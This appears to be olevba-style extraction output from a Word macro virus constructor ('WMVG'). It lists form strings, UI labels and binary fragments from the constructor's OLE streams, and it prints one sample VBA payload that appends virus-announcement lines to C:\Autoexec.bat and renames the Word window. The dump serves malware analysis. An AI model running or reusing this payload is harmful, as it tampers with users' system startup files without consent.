- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Comic Sans MS
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGPayloadDate/i84/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Comic Sans MS
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGPayloadDate/i84/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Comic Sans MS
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGPayloadDate/i84/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Comic Sans MS
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGPayloadDate/i84/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Comic Sans MS
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGPayloadDate/i84/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Comic Sans MS
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGPayloadDate/i84/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Comic Sans MS
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGPayloadDate/i84/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Comic Sans MS
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGPayloadDate/i84/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Comic Sans MS
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGPayloadDate/i84/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Comic Sans MS
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGPayloadDate/i84/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Comic Sans MS
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGPayloadDate/i84/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Comic Sans MS
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGPayloadDate/i84/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Comic Sans MS
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGPayloadDate/i84/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Comic Sans MS
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGPayloadDate/i84/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Comic Sans MS
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGPayloadDate/i84/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Comic Sans MS
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGPayloadDate/i84/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Comic Sans MS
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGPayloadDate/i84/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Comic Sans MS
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGPayloadDate/i84/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Comic Sans MS
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGPayloadDate/i84/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�Back]
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGPayloadDate/i84/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Comic Sans MS
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGPayloadDate/i84/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Comic Sans MS
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGPayloadDate/i84/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Every Days M
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGPayloadDate/i84/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Comic Sans MS
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGPayloadMsg/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�Back�

-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGPayloadMsg/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Comic Sans MS
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGPayloadMsg/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�Clear
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGPayloadMsg/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Comic Sans MS
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGPayloadMsg/i05/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Label1@
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGPayloadMsg/i05/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
K�Qlt
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGPayloadMsg/i05/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
GIF89a$
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGPayloadMsg/i05/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
����������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGPayloadMsg/i05/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�X���0�I����q�C ���-Z8�kIx����k
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGPayloadMsg/i05/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
� 삼
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGPayloadMsg/i05/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
J��gcĶ`
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGPayloadMsg/i05/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���Θ���a^
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGPayloadMsg/i05/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�cr�LTwP`�]����eU,zN
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGPayloadMsg/i05/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
ql[�Fqd
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGPayloadMsg/i05/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�#�3�&�nh4�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGPayloadMsg/i05/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�F����`��7
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGPayloadMsg/i05/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�U���
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGPayloadMsg/i05/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��"��0�#�'
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGPayloadMsg/i05/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���X��l��'	
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGPayloadMsg/i05/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tahoma@
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGPayloadMsg/i05/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Label2@
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGPayloadMsg/i05/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
K�Qlt
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGPayloadMsg/i05/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
GIF89a$
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGPayloadMsg/i05/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�����
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGPayloadMsg/i05/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGPayloadMsg/i05/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�h���0�I�5�!
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGPayloadMsg/i05/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
P��H�'
��W��F�lm�q�+0�O
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGPayloadMsg/i05/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��h.�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGPayloadMsg/i05/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�ك&�S�5
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGPayloadMsg/i05/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�R��J�+܊y
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGPayloadMsg/i05/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
/�8L�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGPayloadMsg/i05/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�r؂.1�l3����
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGPayloadMsg/i05/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
E$p�%;u
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGPayloadMsg/i05/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�+u`{��Z�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGPayloadMsg/i05/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
K�hG��i}�m@��_���������rH���,a���spj��j3�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGPayloadMsg/i05/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
����ǆ
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGPayloadMsg/i05/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���?��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGPayloadMsg/i05/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tahoma@
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGPayloadMsg/i05/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Label3@
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGPayloadMsg/i05/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
K�Qlt
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGPayloadMsg/i05/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
GIF89a$
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGPayloadMsg/i05/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGPayloadMsg/i05/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�X���0�I߸�V���
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGPayloadMsg/i05/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�r��mC+�U<��d��@H�O`6<�H����,�r����LR�H
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGPayloadMsg/i05/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�*�w��5�ڭ�ef���
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGPayloadMsg/i05/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
\xÛ8
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGPayloadMsg/i05/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�.$��nDj\&s�b��O�a,~~���w\�.ztuVx�U��
h�&��YBD���<e����������g|ls�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGPayloadMsg/i05/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���#�+���
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGPayloadMsg/i05/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Ѹ����
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGPayloadMsg/i05/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tahoma@
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGPayloadMsg/i05/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
OptionButton1
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGPayloadMsg/i05/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tahoma@
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGPayloadMsg/i05/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
OptionButton1
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGPayloadMsg/i05/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tahoma@
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGPayloadMsg/i05/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
OptionButton1
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGPayloadMsg/i05/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tahoma@
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGPayloadMsg/i09/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Comic Sans MS
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGPayloadPlugin/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�Enter Your Payload Code Below Using Shift + Enter For Next Line. drv
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGPayloadPlugin/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Comic Sans MS
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGPayloadPlugin/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
H�����
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGPayloadPlugin/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Open "C:\Autoexec.bat" For Append As #1
Print #1, "CLS"
Print #1, "ECHO The WalruS Was Here"
Print #1, "ECHO Youve Got A Virus"
Print #1, "HaHaHaHa"
Close #1
Application.Caption = "The WalruS"��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGPayloadPlugin/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tahoma@
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGPayloadPlugin/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�Back�

-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGPayloadPlugin/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Comic Sans MSrm
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGPayloadPlugin/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�Clear
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGPayloadPlugin/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Comic Sans MSrm
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGPayloadPlugin/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�Dont Enter Sub Code! eg "Sub Payload", "End Sub", Or "On Error Resume Next"3
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGPayloadPlugin/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Comic Sans MS
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGPayloadRandom/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�Please Select Random Frequency
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGPayloadRandom/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Comic Sans MS
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGPayloadRandom/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�EG: Select 5 For 1 In 5 Chance
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGPayloadRandom/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Comic Sans MS
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGPayloadRandom/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�Back]
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGPayloadRandom/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Comic Sans MSrm
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGPayloadRandom/i06/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Comic Sans MS
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGPayloadRandom/i06/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Comic Sans MS
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGPayloadRandom/i06/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Comic Sans MS
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGPayloadRandom/i06/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Comic Sans MS
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGPayloadRandom/i06/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Comic Sans MS
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGPayloadRandom/i06/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Comic Sans MS
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGPayloadRandom/i06/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Comic Sans MS
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGPayloadRandom/i06/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Comic Sans MS
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGPayloadRandom/i06/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Comic Sans MS
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGPayloadRandom/i06/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Comic Sans MS
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGPayloadRandom/i06/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Comic Sans MS
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGPayloadRandom/i06/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Comic Sans MS
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGVirusCreated/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�Play Again?.�

-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGVirusCreated/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Comic Sans MS
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGVirusCreated/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�Yeah!
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGVirusCreated/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Comic Sans MS1m
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGVirusCreated/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�Nah!�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGVirusCreated/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Comic Sans MS1m
-------------------------------------------------------------------------------
VBA FORM Variable "b'Frame2'" IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVG'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'Frame3'" IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVG'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'Frame1'" IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVG'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
